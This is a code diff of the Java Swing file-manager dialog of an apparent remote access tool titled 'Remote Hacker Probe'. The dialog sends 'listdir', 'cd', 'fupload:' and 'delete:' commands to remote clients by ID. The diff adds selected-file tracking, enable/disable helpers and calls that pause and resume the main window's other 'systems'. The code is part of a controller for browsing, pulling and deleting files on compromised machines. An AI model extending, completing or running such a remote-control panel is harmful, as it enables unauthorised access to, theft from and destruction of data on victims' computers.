@@ -51,7 +51,10 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.JComboBox;
 
 
+
+
 class IconRenderer extends DefaultListCellRenderer {
+	
 	
 	String[] video_ext = {
 			"mp4",
@@ -253,14 +256,29 @@ class IconRenderer extends DefaultListCellRenderer {
 
 
 public class FileManager extends JDialog {
+	
+	
 
 	public final static JPanel contentPanel = new JPanel();
 	static JList FileList;
 	public int CLIENT_ID;
+	public static StringBuilder SelectedFile = new StringBuilder("");
 	public static JTextField textField;
 	public static DefaultListModel model;
 	public static List<String> driveslist = new ArrayList<String>();
+	
+	public static Boolean FileMgrOpen = false;
+	
+	public static void DisableFileManager()
+	{
+		FileManager.FileList.setEnabled(false);
+	}
 
+	public static void EnableFileManager()
+	{
+		FileManager.FileList.setEnabled(true);
+	}
+	
 	/**
 	 * Create the dialog.
 	 */
@@ -278,6 +296,8 @@ public class FileManager extends JDialog {
 
 	
 	public FileManager() {
+		
+		MainWindow.HaltAllSystems();
 		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
 		setTitle("Remote Hacker Probe | File Manager");
 		setBounds(100, 100, 761, 410);
@@ -318,6 +338,8 @@ public class FileManager extends JDialog {
 					String File = (String) FileList.getSelectedValue();
 					if(!File.startsWith("(^)")) {
 						String filename = File.replaceAll("\\(.*?\\) ?", "");
+						SelectedFile.replace(0, SelectedFile.length(), filename);
+
 						Server.SendData(Server.Clients.get(CLIENT_ID), "fupload:"+filename);
 						ServerThread.WaitForReply();
 					}
@@ -390,6 +412,7 @@ public class FileManager extends JDialog {
 				{
 					String File = (String) FileList.getSelectedValue();
 					if(!File.startsWith("(^)")) {
+						SelectedFile.replace(0, SelectedFile.length(), File);
 						String filename = File.replaceAll("\\(.*?\\) ?", "");
 						Server.SendData(Server.Clients.get(CLIENT_ID), "delete:"+filename);
 						ServerThread.WaitForReply();
@@ -416,6 +439,7 @@ public class FileManager extends JDialog {
 		            String dir = (String) FileList.getSelectedValue();
 		            if(dir.startsWith("(^)")) {
 		            	String Dirname = dir.replace("(^) ", "");
+		            	SelectedFile.replace(0, SelectedFile.length(), dir);
 		            	Server.SendData(Server.Clients.get(CLIENT_ID), "cd");
 						Server.SendData(Server.Clients.get(CLIENT_ID), Dirname);
 						Refresh();
@@ -438,6 +462,7 @@ public class FileManager extends JDialog {
 		btnGo.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				String Dirname = textField.getText();
+				SelectedFile.replace(0, SelectedFile.length(), Dirname);
 				Server.SendData(Server.Clients.get(CLIENT_ID), "cd");
 				Server.SendData(Server.Clients.get(CLIENT_ID), Dirname);
 				Refresh();
@@ -505,6 +530,12 @@ public class FileManager extends JDialog {
 		    public void windowOpened(WindowEvent we) {
 		        Server.SendData(Server.Clients.get(CLIENT_ID), "listdir");
 		    }
+			
+			@Override
+			public void windowClosed(WindowEvent we) {
+				FileMgrOpen = false;
+				MainWindow.EnableAllSystems();
+			}
 		});
 	}
 }
